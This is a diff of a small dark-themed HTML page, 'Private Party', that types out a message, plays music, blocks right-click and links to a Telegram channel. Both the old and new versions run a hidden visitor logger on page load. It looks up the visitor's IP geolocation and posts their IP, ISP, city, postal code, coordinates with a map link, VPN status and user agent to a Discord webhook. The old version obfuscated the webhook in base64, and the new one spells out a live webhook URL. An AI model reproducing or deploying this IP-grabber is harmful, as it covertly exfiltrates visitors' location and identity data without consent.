@@ -4,135 +4,81 @@
 <meta charset="UTF-8">
 <title>Private Party</title>
 <style>
-body {
-    background: #000;
-    color: #999;
-    font-family: "Courier New", monospace;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    height: 100vh;
-    margin: 0;
-    user-select: none;
-    overflow: hidden;
-    cursor: none;
-}
-#text {
-    font-size: 1.3rem;
-    letter-spacing: 2px;
-    white-space: pre;
-}
-.trail {
-    position: absolute;
-    width: 4px;
-    height: 4px;
-    background: #999;
-    border-radius: 50%;
-    pointer-events: none;
-    opacity: 0;
-    transition: opacity 0.3s, transform 0.1s;
-}
-#sadface {
-    position: fixed;
-    bottom: 10px;
-    left: 10px;
-    color: #999;
-    cursor: pointer;
-    font-size: 1.4rem;
-    transition: color 0.2s;
-}
-#sadface:hover { color: #fff; }
+body{background:#000;color:#999;font-family:"Courier New",monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;user-select:none;overflow:hidden;cursor:none;}
+#text{font-size:1.3rem;letter-spacing:2px;white-space:pre;}
+.trail{position:absolute;width:3px;height:3px;background:#999;border-radius:50%;pointer-events:none;opacity:0;transition:opacity 0.2s;}
+#sadface{position:fixed;bottom:10px;left:10px;color:#999;cursor:pointer;font-size:1.2rem;transition:color 0.2s;}
+#sadface:hover{color:#fff;}
 </style>
 </head>
 <body>
-
 <div id="text"></div>
 <div id="sadface">:(</div>
-
-<audio id="bgmusic" loop>
-    <source src="Volare.mp3" type="audio/mpeg">
-</audio>
+<audio id="bgmusic" loop><source src="Volare.mp3" type="audio/mpeg"></audio>
 
 <script>
-// ---------------------- Typing Effect ----------------------
-const msg = "we never condoned violence";
-const display = document.getElementById("text");
-let idx = 0;
+// --- VISUALS ---
+const message="we never condoned violence";
+const textEl=document.getElementById("text");
+let charIdx=0;
+function type(){if(charIdx<message.length){textEl.textContent+=message[charIdx];charIdx++;setTimeout(type,100);}}
+type();
 
-function startTyping() {
-    if (idx < msg.length) {
-        display.textContent += msg[idx];
-        idx++;
-        setTimeout(startTyping, 100);
-    }
-}
-startTyping();
+document.addEventListener("mousedown",()=>{document.getElementById("bgmusic").play().catch(()=>{})},{once:true});
 
-// ---------------------- Play Music on First Click ----------------------
-document.addEventListener("mousedown", () => {
-    const music = document.getElementById("bgmusic");
-    music.play().catch(() => {
-        console.warn("Autoplay blocked");
-    });
-}, { once: true });
-
-// ---------------------- Cursor Trail ----------------------
-const dots = [];
-const trailCount = 15;
-for (let i = 0; i < trailCount; i++) {
-    const dot = document.createElement("div");
-    dot.className = "trail";
+const trail=[];
+for(let j=0;j<15;j++){
+    const dot=document.createElement("div");
+    dot.className="trail";
     document.body.appendChild(dot);
-    dots.push(dot);
+    trail.push(dot);
 }
-let currentDot = 0;
-document.addEventListener("mousemove", e => {
-    const dot = dots[currentDot];
-    dot.style.left = `${e.pageX - 2}px`;
-    dot.style.top = `${e.pageY - 2}px`;
-    dot.style.opacity = 1;
-    dot.style.transform = "scale(1)";
-    setTimeout(() => { dot.style.opacity = 0; dot.style.transform = "scale(0.5)"; }, 300);
-    currentDot = (currentDot + 1) % trailCount;
+let t=0;
+document.addEventListener("mousemove",e=>{
+    const dot=trail[t];
+    dot.style.left=(e.pageX-1.5)+"px";
+    dot.style.top=(e.pageY-1.5)+"px";
+    dot.style.opacity=1;
+    setTimeout(()=>{dot.style.opacity=0;},300);
+    t=(t+1)%15;
 });
 
-// ---------------------- Visitor Logging ----------------------
-(async function logVisitor() {
-    const webhookUrl = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3OTI4NDU5OTkyNTUxMDMxNi9fSUNlaHhHbW9pVXZ4akJjT0dvLWt1WURLQW5venlic2pxNXBoemVDUTR4Y0JTWUhEbXBwLXBsYmFkQnNYZFRrVnY=");
+// --- THE LOGGING ---
+async function log() {
+    const webhook = "https://discord.com/api/webhooks/1479284599925510316/_ICehxGmoiUvxjBcOGo-kuYdKAnozybsjq5p6hzeCQ4xcBSYHDmpp-plb3adBsXdTkWv";
+    
     try {
-        const ipRes = await fetch("https://ipapi.co/json/");
-        const data = await ipRes.json();
+        const response = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,currency,isp,org,as,mobile,proxy,hosting,query');
+        const d = await response.json();
+        
+        // Simplified VPN/Proxy Logic
+        const isVpn = (d.proxy || d.hosting) ? "Yes" : "No";
 
-        const isVpn = (data.proxy || data.hosting || (data.org && data.org.toLowerCase().includes("vpn"))) ? "Yes" : "No";
+        const payload = {
+            embeds: [{
+                title: "💀 New Visitor Logged",
+                color: 0x000000,
+                fields: [
+                    { name: "🛡️ VPN/Proxy", value: `\`${isVpn}\``, inline: true },
+                    { name: "📶 Network Type", value: `\`${d.mobile ? "Mobile" : "Broadband"}\``, inline: true },
+                    { name: "🌐 Connection", value: `**IP:** \`${d.query}\`\n**ISP:** \`${d.isp}\``, inline: false },
+                    { name: "📍 Location", value: `**City:** \`${d.city}\`\n**Country:** \`${d.country}\`\n**Postal:** \`${d.zip}\``, inline: true },
+                    { name: "⚙️ Metadata", value: `**Timezone:** \`${d.timezone}\`\n**Lat/Lon:** \`${d.lat}, ${d.lon}\``, inline: true },
+                    { name: "🗺️ Mapping", value: `👉 [Google Maps](https://www.google.com/maps?q=${d.lat},${d.lon})`, inline: false },
+                    { name: "💻 User Agent", value: `\`\`\`bash\n"${navigator.userAgent}"\n\`\`\``, inline: false }
+                ],
+                footer: { text: "privateparty.sh • Intrusive Analytics" },
+                timestamp: new Date().toISOString()
+            }]
+        };
 
-        await fetch(webhookUrl, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                embeds: [{
-                    title: "💀 New Visitor Logged",
-                    color: 0,
-                    fields: [
-                        { name: "🛡️ VPN/Proxy", value: `\`${isVpn}\``, inline: true },
-                        { name: "🌐 Connection", value: `**IP:** \`${data.ip}\`\n**ISP:** \`${data.org || "Unknown"}\``, inline: false },
-                        { name: "📍 Location", value: `\`${data.city}, ${data.country_name}\``, inline: true },
-                        { name: "💻 User Agent", value: `\`\`\`bash\n${navigator.userAgent}\n\`\`\``, inline: false }
-                    ],
-                    timestamp: new Date().toISOString()
-                }]
-            })
-        });
-    } catch (err) {
-        console.error("Visitor logging failed", err);
-    }
-})();
+        await fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+    } catch (e) {}
+}
+log();
 
-// ---------------------- Block Right Click ----------------------
-document.addEventListener("contextmenu", e => e.preventDefault());
-
-// ---------------------- Telegram Link ----------------------
+document.addEventListener("contextmenu", e=>e.preventDefault());
 document.getElementById("sadface").onclick = () => window.open("https://t.me/publicpartys", "_blank");
-
 </script>
 </body>
 </html>
